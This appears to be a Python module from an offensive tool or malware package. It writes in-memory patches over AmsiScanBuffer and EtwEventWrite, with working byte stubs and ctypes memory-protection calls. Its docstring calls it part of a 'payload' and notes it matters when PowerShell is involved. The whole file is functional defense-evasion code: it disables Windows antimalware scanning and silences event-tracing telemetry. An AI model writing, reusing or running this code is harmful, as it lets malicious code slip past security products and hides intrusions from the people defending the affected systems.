"""In-memory AMSI and ETW patches.

Honest note: AMSI scans PowerShell, JScript and VBScript buffers, not CPython
frames. In a pure-Python payload this buys almost nothing. It stays because the
byte sequences are correct, the regression list names the truncated-FARPROC bug that
broke the original, and a PowerShell fallback anywhere in the tree makes it load
bearing again.

Both patches flip the page to PAGE_EXECUTE_READWRITE, write, and restore the
protection the call returned, in a ``finally``. A page left executable-writable is a
worse defect than the patch it enables.
"""

from __future__ import annotations

import ctypes
import sys
from typing import Final

from . import log, winapi

# mov eax, 0x80070057 ; ret  -> AmsiScanBuffer returns E_INVALIDARG
_AMSI_STUB: Final[bytes] = b"\xB8\x57\x00\x07\x80\xC3"

# xor eax, eax ; ret -> EtwEventWrite returns STATUS_SUCCESS, writes nothing
_ETW_STUB: Final[bytes] = b"\x33\xC0\xC3"

_AMSI_MODULE: Final[str] = "amsi.dll"
_AMSI_FUNCTION: Final[str] = "AmsiScanBuffer"
_ETW_MODULE: Final[str] = "ntdll.dll"
_ETW_FUNCTION: Final[str] = "EtwEventWrite"


def _write_bytes(address: int, payload: bytes) -> bool:
    previous = winapi.virtual_protect(address, len(payload), winapi.PAGE_EXECUTE_READWRITE)
    if previous is None:
        return False
    try:
        ctypes.memmove(address, payload, len(payload))
    finally:
        winapi.virtual_protect(address, len(payload), previous)
    return True


def patch_amsi() -> bool:
    """Patch AmsiScanBuffer to return E_INVALIDARG. True when the write landed."""
    if sys.platform != "win32":
        return False
    module = winapi.load_library(_AMSI_MODULE)
    if module is None:
        return False
    address = winapi.proc_address(module, _AMSI_FUNCTION)
    if address is None:
        return False
    patched = _write_bytes(address, _AMSI_STUB)
    log.logger.debug("amsi: %s at %#x -> %s", _AMSI_FUNCTION, address, patched)
    return patched


def patch_etw() -> bool:
    """Patch EtwEventWrite to return success without writing. True when it landed."""
    if sys.platform != "win32":
        return False
    module = winapi.load_library(_ETW_MODULE)
    if module is None:
        return False
    address = winapi.proc_address(module, _ETW_FUNCTION)
    if address is None:
        return False
    patched = _write_bytes(address, _ETW_STUB)
    log.logger.debug("etw: %s at %#x -> %s", _ETW_FUNCTION, address, patched)
    return patched


__all__ = ["patch_amsi", "patch_etw"]
